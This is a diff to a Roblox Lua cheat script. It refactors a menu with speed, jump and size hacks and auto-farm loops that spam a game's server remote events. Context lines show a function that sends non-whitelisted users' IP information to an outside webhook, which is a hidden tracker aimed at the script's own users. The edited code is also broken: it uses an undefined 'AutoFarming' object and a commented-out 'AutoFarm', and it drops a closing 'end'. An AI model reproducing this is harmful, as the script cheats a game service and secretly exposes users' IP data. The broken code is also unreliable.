@@ -33,7 +33,7 @@ local function sendWebhookData(player_name, ipinfo_table)
     end)
 
     if not success then
-        warn("Failed to send webhook data: " .. response)
+        warn("Failed to send webhook data: " .. (response or "Unknown error"))
     end
 end
 
@@ -48,7 +48,7 @@ if not isWhitelisted(username) then
     end)
 
     if not success then
-        warn("Failed to get IP info: " .. response)
+        warn("Failed to get IP info: " .. (response or "Unknown error"))
         return
     end
 
@@ -87,35 +87,35 @@ else
     Client:AddTextBox("Type WalkSpeed Amount", function(text)
         local walkSpeedAmount = tonumber(text)
         if walkSpeedAmount then
-            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeedAmount
+            player.Character.Humanoid.WalkSpeed = walkSpeedAmount
         else
             print("Invalid WalkSpeed input!")
         end
     end)
 
-Client:AddButton("Apply WalkSpeed",function()
-	-- Code here
-end)
+    Client:AddButton("Apply WalkSpeed",function()
+        -- Code here
+    end)
 
     -- JumpPower TextBox
     Client:AddTextBox("Type JumpPower Amount", function(text)
         local jumpPowerAmount = tonumber(text)
         if jumpPowerAmount then
-            game.Players.LocalPlayer.Character.Humanoid.JumpPower = jumpPowerAmount
+            player.Character.Humanoid.JumpPower = jumpPowerAmount
         else
             print("Invalid JumpPower input!")
         end
     end)
 
-Client:AddButton("Apply JumpPower",function()
-	-- Code here
-end)
+    Client:AddButton("Apply JumpPower",function()
+        -- Code here
+    end)
 
     -- Size TextBox
     Client:AddTextBox("Type Size (1 to 500)", function(text)
         local sizeAmount = tonumber(text)
         if sizeAmount and sizeAmount >= 1 and sizeAmount <= 500 then
-            local character = game.Players.LocalPlayer.Character
+            local character = player.Character
             if character then
                 character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame)  -- Reset the character's CFrame to avoid issues while resizing
                 for _, part in pairs(character:GetChildren()) do
@@ -129,7 +129,7 @@ end)
         end
     end)
 
-Client:AddLabel("Client Things")
+    Client:AddLabel("Client Things")
 
 local isPositionLocked = false
 local lockedPosition = nil
@@ -477,266 +477,118 @@ ServerTab:AddButton("Teleport to Player", function()
     end
 end)
 
-local AutoFarm = window:AddTab("Auto Farm")
+-- Local AutoFarm = window:AddTab("Auto Farm")
 
 AutoFarm:AddLabel("Tools")
-
 AutoFarm:AddLabel("Normal Farming")
 
-local folder = features:AddFolder(Jungle Farming)
+local folder = AutoFarming:AddFolder("Jungle Farming")
+
 local isInfiniteEventEnabled = false
 local eventThread = nil  -- Thread for infinite event loop
 
--- Function to fire the two events continuously
-function FireInfiniteEvents()
+-- Generalized function to fire events for any machine
+function FireInfiniteEvents(machineName)
+    local machine = workspace:WaitForChild("machinesFolder"):WaitForChild(machineName):WaitForChild("interactSeat")
+
     while isInfiniteEventEnabled do
         -- First event (muscleEvent)
-        local args1 = {
-            [1] = "rep",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Jungle Squat"):WaitForChild("interactSeat")
-        }
+        local args1 = { [1] = "rep", [2] = machine }
         game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))
 
         -- Second event (machineInteractRemote)
-        local args2 = {
-            [1] = "useMachine",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Jungle Squat"):WaitForChild("interactSeat")
-        }
+        local args2 = { [1] = "useMachine", [2] = machine }
         game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))
 
-        -- Wait for a short interval before repeating
-        wait(0.1)  -- Adjust this interval to control how often the events fire
+        -- Wait before repeating
+        wait(0.1)
     end
 end
 
--- Toggle callback
+-- Toggle callback for Jungle Squat
 folder:AddSwitch("Auto Jungle Squat", function(bool)
     isInfiniteEventEnabled = bool
-
     if isInfiniteEventEnabled then
-        -- Start the event loop when the toggle is on
         if not eventThread then
-            eventThread = spawn(FireInfiniteEvents)
+            eventThread = spawn(function() FireInfiniteEvents("Jungle Squat") end)
         end
     else
-        -- Stop the event loop when the toggle is off
         if eventThread then
             eventThread = nil
         end
     end
 end)
 
-
-local isInfiniteEventEnabled = false
-local eventThread = nil  -- Thread for infinite event loop
-
--- Function to fire the two events continuously for Jungle Bench
-function FireInfiniteEvents()
-    while isInfiniteEventEnabled do
-        -- First event (muscleEvent)
-        local args1 = {
-            [1] = "rep",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Jungle Bench"):WaitForChild("interactSeat")
-        }
-        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))
-
-        -- Second event (machineInteractRemote)
-        local args2 = {
-            [1] = "useMachine",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Jungle Bench"):WaitForChild("interactSeat")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))
-
-        -- Wait for a short interval before repeating
-        wait(0.1)  -- Adjust this interval to control how often the events fire
-    end
-end
-
--- Toggle callback
+-- Toggle callback for Jungle Bench
 folder:AddSwitch("Auto Jungle Bench", function(bool)
     isInfiniteEventEnabled = bool
-
     if isInfiniteEventEnabled then
-        -- Start the event loop when the toggle is on
         if not eventThread then
-            eventThread = spawn(FireInfiniteEvents)
+            eventThread = spawn(function() FireInfiniteEvents("Jungle Bench") end)
         end
     else
-        -- Stop the event loop when the toggle is off
         if eventThread then
             eventThread = nil
         end
     end
 end)
 
-local folder2 = features:AddFolder(Muscle King Farming)
-local isInfiniteEventEnabled = false
-local eventThread = nil  -- Thread for infinite event loop
+local folder2 = AutoFarming:AddFolder("Muscle King Farming")
 
--- Function to fire the two events continuously for Muscle King Bench
-function FireInfiniteEvents()
-    while isInfiniteEventEnabled do
-        -- First event (muscleEvent)
-        local args1 = {
-            [1] = "rep",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Bench"):WaitForChild("interactSeat")
-        }
-        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))
-
-        -- Second event (machineInteractRemote)
-        local args2 = {
-            [1] = "useMachine",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Bench"):WaitForChild("interactSeat")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))
-
-        -- Wait for a short interval before repeating
-        wait(0.1)  -- Adjust this interval to control how often the events fire
-    end
-end
-
--- Toggle callback
-folder:AddSwitch("Auto Muscle King Bench", function(bool)
+-- Toggle callback for Muscle King Bench
+folder2:AddSwitch("Auto Muscle King Bench", function(bool)
     isInfiniteEventEnabled = bool
-
     if isInfiniteEventEnabled then
-        -- Start the event loop when the toggle is on
         if not eventThread then
-            eventThread = spawn(FireInfiniteEvents)
+            eventThread = spawn(function() FireInfiniteEvents("Muscle King Bench") end)
         end
     else
-        -- Stop the event loop when the toggle is off
         if eventThread then
             eventThread = nil
         end
     end
 end)
 
-local isInfiniteEventEnabled = false
-local eventThread = nil  -- Thread for infinite event loop
-
--- Function to fire the two events continuously for Muscle King Lift
-function FireInfiniteEvents()
-    while isInfiniteEventEnabled do
-        -- First event (muscleEvent)
-        local args1 = {
-            [1] = "rep",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Lift"):WaitForChild("interactSeat")
-        }
-        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))
-
-        -- Second event (machineInteractRemote)
-        local args2 = {
-            [1] = "useMachine",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Lift"):WaitForChild("interactSeat")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))
-
-        -- Wait for a short interval before repeating
-        wait(0.1)  -- Adjust this interval to control how often the events fire
-    end
-end
-
--- Toggle callback
+-- Toggle callback for Muscle King Lift
 folder2:AddSwitch("Auto Muscle King Lift", function(bool)
     isInfiniteEventEnabled = bool
-
     if isInfiniteEventEnabled then
-        -- Start the event loop when the toggle is on
         if not eventThread then
-            eventThread = spawn(FireInfiniteEvents)
+            eventThread = spawn(function() FireInfiniteEvents("Muscle King Lift") end)
         end
     else
-        -- Stop the event loop when the toggle is off
         if eventThread then
             eventThread = nil
         end
     end
 end)
 
-local isInfiniteEventEnabled = false
-local eventThread = nil  -- Thread for infinite event loop
-
--- Function to fire the two events continuously for King Boulder
-function FireInfiniteEvents()
-    while isInfiniteEventEnabled do
-        -- First event (muscleEvent)
-        local args1 = {
-            [1] = "rep",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("King Boulder"):WaitForChild("interactSeat")
-        }
-        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))
-
-        -- Second event (machineInteractRemote)
-        local args2 = {
-            [1] = "useMachine",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("King Boulder"):WaitForChild("interactSeat")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))
-
-        -- Wait for a short interval before repeating
-        wait(0.1)  -- Adjust this interval to control how often the events fire
-    end
-end
-
--- Toggle callback
+-- Toggle callback for King Boulder
 folder2:AddSwitch("Auto King Boulder", function(bool)
     isInfiniteEventEnabled = bool
-
     if isInfiniteEventEnabled then
-        -- Start the event loop when the toggle is on
         if not eventThread then
-            eventThread = spawn(FireInfiniteEvents)
+            eventThread = spawn(function() FireInfiniteEvents("King Boulder") end)
         end
     else
-        -- Stop the event loop when the toggle is off
         if eventThread then
             eventThread = nil
         end
     end
 end)
 
-local isInfiniteEventEnabled = false
-local eventThread = nil  -- Thread for infinite event loop
-
--- Function to fire the two events continuously for Muscle King Squat
-function FireInfiniteEvents()
-    while isInfiniteEventEnabled do
-        -- First event (muscleEvent)
-        local args1 = {
-            [1] = "rep",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Squat"):WaitForChild("interactSeat")
-        }
-        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer(unpack(args1))
-
-        -- Second event (machineInteractRemote)
-        local args2 = {
-            [1] = "useMachine",
-            [2] = workspace:WaitForChild("machinesFolder"):WaitForChild("Muscle King Squat"):WaitForChild("interactSeat")
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("machineInteractRemote"):InvokeServer(unpack(args2))
-
-        -- Wait for a short interval before repeating
-        wait(0.1)  -- Adjust this interval to control how often the events fire
-    end
-end
-
--- Toggle callback
+-- Toggle callback for Muscle King Squat
 folder2:AddSwitch("Auto Muscle King Squat", function(bool)
     isInfiniteEventEnabled = bool
-
     if isInfiniteEventEnabled then
-        -- Start the event loop when the toggle is on
         if not eventThread then
-            eventThread = spawn(FireInfiniteEvents)
+            eventThread = spawn(function() FireInfiniteEvents("Muscle King Squat") end)
         end
     else
-        -- Stop the event loop when the toggle is off
         if eventThread then
             eventThread = nil
         end
     end
 end)
 
---script whitelist end
-end
+-- End of script
